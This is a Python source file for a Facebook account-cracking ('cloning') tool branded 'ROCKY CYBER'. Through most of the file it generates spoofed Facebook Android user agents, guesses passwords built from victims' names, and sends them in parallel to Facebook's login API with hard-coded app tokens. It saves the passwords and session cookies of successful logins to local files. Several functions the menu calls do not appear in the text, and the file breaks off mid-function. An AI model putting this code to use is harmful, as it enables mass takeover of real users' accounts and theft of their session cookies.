#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re,pycurl,io
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import random
import string



model2 ="""M2101K6G
Aquaris U Plus
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V""".splitlines()
#___________________MAIN UA_______________#
def ____ua____():
    dalvik_model = random.choice([
        'SM-T835',
        'SM-S901U',
        'SM-S134DL',
        'SM-J250F',
        'SM-A217F',
        'SM-A326B',
        'SM-A125F',
        'SM-A720F',
        'SM-A326U',
        'SM-G532M',
        'SM-J410G',
        'SM-A205GN',
        'SM-A205GN',
        'SM-A505GN',
        'SM-G930F',
        'SM-J210F',
        'SM-N9005',
        'SM-J210F',
        'CPH2083',
        'CPH2235',
        'CPH2499',
        'CPH2185',
        'CPH2065',
        'CPH2197',
        'CPH1989',
        'CPH2145',
        'F1w',
        'CPH1909',
        'CPH2065',
        'CPH1937',
        'CPH2095',
        'CPH2083',
        'CPH2249',
        'CPH2083',
        'CPH2239',
        'CPH1979',
        'CPH2067',
        'CPH2069',
        'CPH2239',
        'CPH2015',
        'CPH2021',
        'CPH2205',
        'CPH2069',
        'CPH2161',
        'CPH2207',
        'CPH2239',
        'CPH1909',
        'CPH2185',
        'CPH2127',
        'CPH1923',
        'CPH1931',
        'PHN110',
        'CPH2599',
        'CPH2499',
        'CPH2557',
        'CPH8686',
        'CPH9177',
        'CPH9226',
        'OPPO F1 Plus',
        'CPH2071',
        'PCHM00',
        'CPH2083',
        'CPH2185',
        'CPH2179',
        'CPH2269',
        'CPH2421',
        'CPH2349',
        'CPH2271',
        'CPH2477',
        'CPH2471',
        'CPH2591',
        'CPH1923',
        'CPH1925',
        'CPH1837',
        'OPPO A30',
        'RMX1945',
        'RMX1911',
        'RMX2193',
        'RMX1945',
        'RMX1931',
        'RMX2170',
        'RMX3201',
        'RMX2180',
        'RMX2021',
        'RMX2020',
        'RMX2155',
        'RMX1921',
        'RMX2156',
        'RMX3363',
        'RMX3081',
        'RMX2001',
        'RMX2001',
        'RMX3263',
        'RMX2155',
        'RMX2001',
        'RMX3195',
        'RMX1945',
        'RMX1945',
        'RMX1993',
        'vivo 1901',
        'V2026',
        'V2058',
        'vivo 1716',
        'vivo 1808',
        'vivo 1935',
        'vivo 1951',
        'vivo 1906',
        'vivo 1808',
        'vivo 1920',
        'vivo 1901',
        'V2026',
        'V2058',
        'vivo 1716',
        'vivo 1935',
        'vivo 1951',
        'vivo 1906',
        'V2111',
        'vivo 1915',
        'V1911A',
        'V2036',
        'vivo 1907',
        'vivo 1906',
        'vivo 1915',
        'V2025',
        'vivo 1820',
        'vivo 1904',
        'vivo 1901',
        'V1955A',
        'LG-H342',
        'Redmi Note 4',
        'Redmi 4X',
        'Redmi 3',
        'Redmi 4',
        'Redmi 3X',
        'Redmi Note 7',
        'Redmi 6A',
        'Redmi Note 8 Pro',
        'Redmi 5A',
        'Redmi 5',
        'Redmi 6 Pro',
        'Redmi Note 5',
        'Redmi Note 4',
        'Redmi Y2',
        'Redmi 7A',
        'Redmi Note 7S',
        'Redmi Note 8T',
        'Redmi Note 8 Pro',
        'M2003J15SC',
        'Redmi 5 Plus',
        'Redmi Note 9 Pro',
        'Redmi Note 9S',
        'LDN-L21',
        'M2103K19G'])
    model = random.choice([
        'vivo 1901',
        'V2120'])
    android_version = f'''{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'''
    fb_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fb_version_code = str(random.randint(10000000, 66666666))
    dens = random.choice(['2.0','2.5','3.0','4.0','1.5', '2.625', '1.75', '3.5','1.0','1.1']) 
    width = random.choice(['720','1080', '1440','1280','1426','2345','2351']) 
    pkg = random.choice(['720','1280','2131','2034','2196', '1426'])
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    fbrv = str(random.randint(0, 999999999))
    last = f'''[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/''' + '{density=2.5,width=1440,height=1426}' + f''';en_Qaag_US;FBRV/{fbrv};FBCR/Airtel;FBMF/vivo;FBBD/vivo;FBPN/'+str(platform)+';FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v8a:armeabi;]'''
    first = f'''Dalvik/2.1.0 (Linux; U; Android {android_version}; {dalvik_model} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + last
    return first
#_____________________(VOICE________________#
#os.system('espeak -b 1000 "welcome Rocki command"')
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; 🅡🅞🅒🅚🅨 🅚🅗🅐🅝 \x07')
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}─────────────────────────────────────────────────')
#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for xd in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    #ua
os.system('clear')
import time
import sys

# ANSI escape codes for colors
colors = [
    "\033[91m",  # Red
    "\033[92m",  # Green
    "\033[93m",  # Yellow
    "\033[94m",  # Blue
    "\033[95m",  # Magenta
    "\033[96m",  # Cyan
    "\033[97m",  # White
    "\033[0m"    # Reset
]

# Loading animation function
def loading_animation(duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        for color in colors:
            # Displaying the loading box
            sys.stdout.write(f"\r{color}Loading... [■□□]")
            sys.stdout.flush()
            time.sleep(0.2)  # Wait for a short moment
            sys.stdout.write(f"\r{color}Loading... [□■□]")
            sys.stdout.flush()
            time.sleep(0.2)
            sys.stdout.write(f"\r{color}Loading... [□□■]")
            sys.stdout.flush()
            time.sleep(0.2)
    # Resetting the color
    sys.stdout.write("\033[0m\n")

# Run the loading animation for 5 seconds
loading_animation(4) 

from datetime import datetime

def format_facebook_card_date(date):
    # Format the date to a string suitable for a Facebook card
    return date.strftime("%B %d, %Y")  # e.g., "October 10, 2023"

# Example usage
if __name__ == "__main__":
    # Get the current date
    current_date = datetime.now()
    
    # Format the date for the Facebook card
    formatted_date = format_facebook_card_date(current_date)
    
    # Print the formatted date
    

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
  #  END = "[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2176};FBLC/it_IT;FBRV/0;FBCR/vodafone IT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
    END = '"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#──────────────{ UA-FOR-RANDOM }──────────────#
def fuckx():
	model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	return bal


#──────────────{ LOGO }──────────────#
logo = f"""
\033[1;93m┃▗▄▄▖  ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▖  ▗▖▗▄▄▖\033[1;95m ┃▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
\033[1;93m┃▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘ ▝▚▞▘▐▌   \033[1;95m ┃▐▌  ▐▌  █  ▐▌ ▐▌
\033[1;93m┃▐▛▀▚▖▐▌ ▐▌▐▌   ▐▛▚▖   ▐▌ ▐▌▝▜▌\033[1;95m ┃▐▌  ▐▌  █  ▐▛▀▘
\033[1;93m┃▐▌ ▐▌▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌  ▐▌ ▝▚▄▞▘\033[1;95m ┃ ▝▚▞▘ ▗▄█▄▖▐▌
\033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;95m┻\033[1;93m━━━━━━━━━━━━━━━
\033[1;93m┏━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
\033[1;93m┃\033[1;37m JOIN MY TALIGRAM\033[1;93m  ┃\033[1;37m ROCKY CYBER 4G     \033[1;93m┃
\033[1;93m┃\033[1;37m FOLLOW  NEW PAGE\033[1;93m  ┃\033[1;37m ROCKY CYBER 4G     \033[1;93m┃
\033[1;93m┃\033[1;37m FACEBOOK ACCOUNT\033[1;93m  ┃ \033[1;37mHARDLESS PRINCE    \033[1;93m┃
\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━┛
\033[1;31m[\033[1;37m®\033[1;31m]\033[1;37m DEVELOPER   :  ROCKY CYBER
\033[1;31m[\033[1;37m®\033[1;31m]\033[1;37m FACEBOOK    :  ROCKY KHAN 
\033[1;31m[\033[1;37m®\033[1;31m]\033[1;37m GITHUB      :  ROCKY CYBER
\033[1;31m[\033[1;37m®\033[1;31m]\033[1;37m VERSION     :  \033[0;101m[Premium/v00.1]\033[0m
\033[1;31m[\033[1;37m®\033[1;31m]\033[1;37m TOOL        :  \033[0;102m[VIP CLONING]\033[0m
"""
#──────────────{ MENU }──────────────#
def ROCKY():
	model = random.choice(["X6815C,", "Infinix X6511B","Infinix X678B","Infinix X605","Infinix X6710","Infinix X6711","Infinix X6716B","Infinix X6820","Infinix X677","Infinix X695","Infinix X6832","Infinix Zero 4 Plus"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/487.1.0.74.74;FBBV/456417358;FBDM/"+"{density=3.4,width=1440,height=2436}"+f";FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.0;FBOP/6;FBCA/armeabi-v7a:armeabi;]"
	return bal
#vuda

def menu():
	clear()
	print(f"{G}【1】 FILE CLONING [ HACK FRR FIRE GAME ID ] ")
	print(f"{G}【2】 RANDOM CLONING [HACK FOLLOWAR ID ]")
	print(f"{G}【3】 GMAIL CLONING")
	print(f"{G}【4】 B-GRAPH UPDATE")
	print(f"{R}【0】 EXIT CLONING")
	linex()
	option = input(f'{A}|?| CHOICE : ')
	if option in ['A','1']:__Filex__()
	elif option in ['B','2']:__Randmx__()
	elif option in ['C','3']:__Gmailx__()
	elif option in ['D','4']:rock()
	elif option in ['00','0']:exit()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/Filename.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");linex();methodx = input(f'{A}|?| CHOICE : ')
#	print(f"{A}|5| METHOD M5 ")
#	print(f"{A}|6| METHOD M6 ")
#	print(f"{A}|7| METHOD M7 ")
#	print(f"{A}|8| METHOD M8 ")
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A}|?| PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{G}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as ROCKYx:
        clear();total_ids = str(len(dx))
        print(f"{G}|=| FILE UID {G}|{G} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:ROCKYx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:ROCKYx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:ROCKYx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:ROCKYx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:ROCKYx.submit(__file_M5__,ids,names,passlist)
            if methodx in ['6']:ROCKYx.submit(__file_M6__,ids,names,passlist)
            if methodx in ['7']:ROCKYx.submit(__file_M7__,ids,names,passlist)
            if methodx in ['8']:ROCKYx.submit(__file_M8__,ids,names,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ FILE-METHOD-M1 }──────────────#
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ROCKY-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": ____ua____(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|R 4 G_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ROCKY-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|R 4 G_CP| '+ids+f' | '+pas)
                open('/sdcard/ROCKY-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
 #-----ua ganaretor 
def rock():
    dens = random.choice(['2.0','2.5','3.0','4.0','1.5', '2.625', '1.75', '3.5','1.0','1.1']) 
    width = random.choice(['720','1080', '1440','1280','1426','2345','2351']) 
    pkg = random.choice(['720','1280','2131','2034','2196', '1426'])
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    sum = random.choice(["SM-M405F","SM-M405FN","SM-M405G","SM-G750F","SM-G7508","SM-G7508Q","SM-G750H","SM-G750A","SM-N971U","SM-N971N"])
    oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929"])
    vivo = random.choice(["V1963A","V1990A","V1911A","V1919A","1919"",V1921A","V1921T","1921","V1730GA","Vivo Z34","V1813BT","V1813BA","V1730DA","V1730DT","V1945A","V1945T","V1813A","V1813T","1814","1815","V1818A","V1818T","V2052","V2054","V2070","V2101","V2037","V2065","Vivo Y20G","Vivo Y20","Vivo Y19t","Vivo Y20A","Vivo X20 Plus UD"])    
    rocky1=f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.16.236;FBPN/'+str(platform)+';FBLC/en_US;FBBV/'+str(vir)+';FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;]'
    rocky2=f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/'+str(cho)+'.1.0.17.119;FBPN/'+str(platform)+';FBLC/en_US;FBBV/'+str(vir)+';FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;] '
    rocky3=f'Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.17.95;FBPN/'+str(platform)+';FBLC/en_ZA;FBBV/'+str(vir)+';FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;] FBBK/1'
    rocky4=f'Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/'+str(cho)+'.1.0.9.122;FBPN/'+str(platform)+';FBLC/en_US;FBBV/'+str(vir)+';FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;]'
    rocky5=f'Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.14.119;FBPN/'+str(platform)+';FBLC/es_ES;FBBV/'+str(vir)+';FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;] FBBK/1'
    rocky6=f'Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/'+str(cho)+'.0.0.50.119;FBPN/'+str(platform)+';FBLC/es_MX;FBBV/'+str(vir)+';FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'+'FB_FW/1;FBRV/0;]'
    rocky7=f'Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/'+str(cho)+'.0.0.16.120;FBPN/'+str(platform)+';FBLC/en_GB;FBBV/'+str(vir)+';FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/'+'{density='+str(dens) +',width='+str(width)+',height='+str(pkg)+'};'f'FB_FW/1;] FBBK/1'
